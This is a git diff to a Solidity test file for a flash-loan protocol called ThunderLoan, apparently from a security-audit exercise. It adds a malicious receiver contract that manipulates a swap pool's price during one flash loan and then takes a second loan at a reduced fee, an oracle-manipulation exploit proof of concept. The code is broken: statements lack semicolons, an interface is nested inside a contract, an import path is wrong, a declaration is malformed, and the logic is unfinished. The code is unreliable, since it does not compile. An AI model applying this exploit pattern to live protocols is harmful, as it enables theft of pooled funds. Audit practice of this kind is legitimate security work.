@@ -8,7 +8,8 @@ import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
 import {ERC20Mock} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {BuffMockPoolFactory} from "../mocks/BuffMockPoolFactory.sol";
 import {BuffMockTSwap} from "../mocks/BuffMockTSwap.sol";
-import {IFlashLoanReceiver} from "../../src/interface/IFlashLoanReceiver.sol"
+import {IFlashLoanReceiver} from "../../src/interface/IFlashLoanReceiver.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract ThunderLoanTest is BaseTest {
     uint256 constant AMOUNT = 10e18;
@@ -147,11 +148,15 @@ contract MaliciousFlashLoanReciver is IFlashLoanReciver{
     ThunderLoan thunderLoan;
     address repayAddress;
     BuffMockTSwap;
+    bool attacked;
+    uint256 feeOne;
+    uint256 feeTwo;
 
     constructor(address _tswapPool, address _thunderLoan, address _repayAddresss){
         tswapPool = BuffMockTSwap(_tswapPool);
         thunderLoan = ThunderLoan(_thunderLoan);
         repayAddress = _repayAddresss;
+
     }
 
     interface IFlashLoanReceiver {
@@ -164,4 +169,17 @@ contract MaliciousFlashLoanReciver is IFlashLoanReciver{
     )
         external
         returns (bool);
+    { 
+        if(!attacked){
+            feeOne = fee;
+            attacked = true;
+            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18,100e18);
+            IERC20(token).approve(address(tswapPool))
+            tswapPool.swapPoolToekForWethBasedOnInputPoolToken(50e18, wethBought,block.timestamp)
+            thunderLoan.flashloan(address(this),IERC20(token),amount,"");
+
+        } else {
+
+        }
+}
 }
